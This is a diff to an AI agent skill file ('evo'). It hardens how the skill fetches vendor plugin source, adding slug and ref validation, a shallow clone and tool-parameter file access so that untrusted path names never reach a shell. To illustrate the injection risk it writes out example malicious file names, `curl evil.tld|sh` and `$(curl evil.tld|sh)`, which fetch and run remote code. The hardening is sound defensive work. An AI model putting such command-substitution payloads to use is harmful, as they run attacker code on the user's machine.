@@ -3,7 +3,7 @@ name: evo
 description: Capture a lesson and add it to the appropriate evolution overlay — a per-agent file, per-skill file, or project-wide rules file. Use when the user identifies a behavior to improve, a mistake to prevent, a project convention, a team role, a tech-stack constraint, or any pattern worth persisting beyond the current session. Appends to `.ievo/evolution/<scope>/<name>.md` (overlay file). The agent/skill body is never modified — overlays are read at dispatch time via a one-time marker injection.
 license: MIT
 effort: low
-compatibility: Works on any agentskills.io-compatible platform. Sub-agent isolation (Task tool dispatch) is available on Claude Code and Codex with the iEvo plugin; other platforms execute steps inline.
+compatibility: Works on any agentskills.io-compatible platform. Sub-agent isolation (Task tool dispatch) is available on Claude Code and Codex with the iEvo plugin; other platforms execute steps inline. Requires `gh` CLI for API metadata and `git` for cloning a vendor target's source repo before file reads.
 hooks:
   PostToolUse:
     - matcher: "Write"
@@ -118,7 +118,61 @@ If the target lives in a plugin (not already in `.claude/<type>/`):
 - For agent: copy `<plugin>/agents/<name>.md` → `<project>/.claude/agents/<name>.md`
 - For skill: copy `<plugin>/skills/<name>/` directory → `<project>/.claude/skills/<name>/` (whole tree)
 
-Use `gh api repos/<owner>/<repo>/contents/<path>` for fetching source.
+### How to fetch source — clone once, read/write with the Read/Write tools
+
+`<owner>`/`<repo>` are resolved from the target plugin's own installed
+metadata (its marketplace `source` entry, or equivalent installed-plugin
+record); `<path>` is `<plugin>/agents/<name>.md` or `<plugin>/skills/<name>/`
+per the "Vendor the file" bullets above. A git tree entry's path can contain
+almost any byte — only NUL is structurally forbidden — so a malicious
+plugin repo can name a file or directory `` `curl evil.tld|sh` `` or
+`$(curl evil.tld|sh)`. `<owner>`, `<repo>`, and `<path>` here all trace back
+to that upstream plugin repo's own metadata/tree, exactly as untrusted as
+any other name in it. Building a
+`gh api repos/<owner>/<repo>/contents/<path>` Bash command line from these
+values lets the shell resolve any backtick/`$()` inside them as command
+substitution **before** the intended command runs — double-quoting does not
+stop this. Fetch source this way instead — no untrusted byte ever crosses a
+shell:
+
+1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset
+   before using them anywhere — owner matches
+   `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`, repo matches `^[A-Za-z0-9._-]{1,100}$`
+   (the same constraint `scan_repo.mjs`'s `OWNER_REPO_RE` enforces). Refuse
+   and report if either fails.
+2. **Resolve and validate the ref, then the commit.** `gh api
+   "repos/<owner>/<repo>" --jq '.default_branch'` — the returned branch name
+   can legally contain shell metacharacters, so validate it against the same
+   ref allowlist `inspect/SKILL.md` Step 1 uses (`^[A-Za-z0-9._/-]+$`, no
+   leading `-`, no `..`/`@{`) before any further use. Refuse and report if it
+   fails. Only then call `gh api "repos/<owner>/<repo>/commits/<default-branch>"
+   --jq '.sha'` and validate the result matches `^[0-9a-f]{7,40}$` — this
+   becomes the `commit_sha` recorded in Step 4's overlay frontmatter.
+3. **Shallow-clone into a fresh, per-invocation `mktemp -d` directory** —
+   never a shared checkout path:
+   ```bash
+   CHECKOUT_DIR=$(mktemp -d)
+   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
+   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
+   git -C "$CHECKOUT_DIR" checkout <commit-sha>
+   ```
+4. **For an agent** (`<path>` = `<plugin>/agents/<name>.md`): read
+   `$CHECKOUT_DIR/<path>` with the **Read tool** (its full path passed as the
+   `file_path` parameter — never Bash `cat`), then write the content to
+   `<project>/.claude/agents/<name>.md` with the **Write tool**.
+5. **For a skill** (`<path>` = `<plugin>/skills/<name>/`, whole tree):
+   enumerate it with the **Glob tool** (`pattern: "**/*"`, `path:
+   "$CHECKOUT_DIR/<path>"` — never a Bash `find`/`ls`), then **Read** each
+   listed file and **Write** it to the matching relative location under
+   `<project>/.claude/skills/<name>/`. Glob and Read/Write all take paths as
+   direct parameters, never shell text, so neither a malicious `<path>` nor a
+   malicious file name inside the skill directory can reach a shell.
+
+Record `fetched_at` as the current ISO timestamp once the copy completes.
+
+If cloning or resolution fails (private repo, no network), report the
+failure — do NOT fall back to per-file `gh api` fetching, which reintroduces
+the injection this replaces.
 
 **This is one-time.** Subsequent evolutions on the same target reuse the local copy.
 
@@ -348,6 +402,7 @@ Output a short summary to the user:
 - **Temporal anchoring.** A lesson that asserts *how the system currently works* (e.g. "workflow X runs only on non-draft PRs", "the /foo comment triggers nothing") rots silently: overlays are read live as instructions at every dispatch, so the claim keeps being applied after the system moves and the entry becomes false. When a lesson makes such a claim, surface it and steer it one of two ways before appending — do NOT silently rewrite the verbatim text (that would violate "Verbatim lesson text"): (a) if it is a point-in-time observation, anchor it in time — past tense, scoped to its moment, with a date/PR anchor where available ("at the time, before <PR/date>, X only ran on Y") so the entry stays true under ANY later change to the system it mentions; or (b) if it is meant as durable current behavior, it belongs in the owning agent/skill body or an overlay *rule*, not a dated snapshot entry. This complements Conflict surfacing: that rule catches a new lesson contradicting an old one; this one catches the system moving out from under an old, unchallenged lesson.
 - **Idempotent failures.** If any step fails (write fails, gh api error), report what was done and what was not. Don't leave inconsistent state.
 - **Project-wide overlay is shared.** All project-wide rules accumulate in one `project.md`. No splitting by topic — chronological with `## Trigger` field for context.
+- **Never interpolate a path — `<owner>`, `<repo>`, or the target `<path>` — into a Bash/`gh api` command.** Clone once, enumerate with the Glob tool, and read/write with the Read/Write tools instead — see § "How to fetch source" in Step 2. A git tree entry can legally contain shell metacharacters (backtick, `$()`, `;`, `|`, quotes); only ever passing such values as direct tool parameters, never embedded in a command string, closes that off.
 
 ## Why overlay model
 
